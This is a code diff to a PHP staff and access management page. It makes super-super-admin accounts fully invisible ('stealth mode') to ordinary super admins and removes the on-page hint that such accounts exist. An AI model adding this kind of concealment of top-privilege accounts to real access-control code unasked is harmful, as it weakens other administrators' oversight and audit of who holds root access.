@@ -113,19 +113,29 @@ if (isset($_GET['delete'])) {
     }
 }
 
-// Fetch all admins ordered by hierarchy and creation date
-$admins = $conn->query("SELECT * FROM admin_users ORDER BY 
-    CASE role 
-        WHEN 'super_super_admin' THEN 1 
-        WHEN 'super_admin' THEN 2 
-        ELSE 3 
-    END ASC, created_at DESC");
+// Fetch admins:
+// - If Super Super Admin: view ALL accounts
+// - If standard Super Admin: completely hide Super Super Admins so they are 100% invisible (stealth mode)
+if ($isSuperSuperAdmin) {
+    $admins = $conn->query("SELECT * FROM admin_users ORDER BY 
+        CASE role 
+            WHEN 'super_super_admin' THEN 1 
+            WHEN 'super_admin' THEN 2 
+            ELSE 3 
+        END ASC, created_at DESC");
+} else {
+    $admins = $conn->query("SELECT * FROM admin_users WHERE role != 'super_super_admin' ORDER BY 
+        CASE role 
+            WHEN 'super_admin' THEN 1 
+            ELSE 2 
+        END ASC, created_at DESC");
+}
 ?>
 
 <div class="page-header d-flex align-items-center justify-content-between mb-4">
     <div>
         <h2 class="text-white mb-1"><i class="fas fa-user-shield me-2 text-primary"></i> Staff & Access Management</h2>
-        <p class="text-muted small mb-0">Manage portal administrative credentials, passwords, and role hierarchies.</p>
+        <p class="text-muted small mb-0">Manage portal administrative credentials and role hierarchies.</p>
     </div>
     <div>
         <?php if ($isSuperSuperAdmin): ?>
@@ -171,11 +181,6 @@ $admins = $conn->query("SELECT * FROM admin_users ORDER BY
                             <option value="super_super_admin">⚡ Super Super Admin (Full Root & Reconciler)</option>
                         <?php endif; ?>
                     </select>
-                    <?php if (!$isSuperSuperAdmin): ?>
-                        <div class="form-text text-muted mt-1" style="font-size: 11px;">
-                            <i class="fas fa-info-circle me-1 text-warning"></i>Only Super Super Admins can create Super Super Admin accounts.
-                        </div>
-                    <?php endif; ?>
                 </div>
                 <button type="submit" name="add_admin" class="btn btn-primary w-100 py-2 mt-2" style="background: linear-gradient(135deg, #0ea5e9, #6366f1); border: none; font-weight: 600;">
                     <i class="fas fa-plus-circle me-1"></i> Register Admin
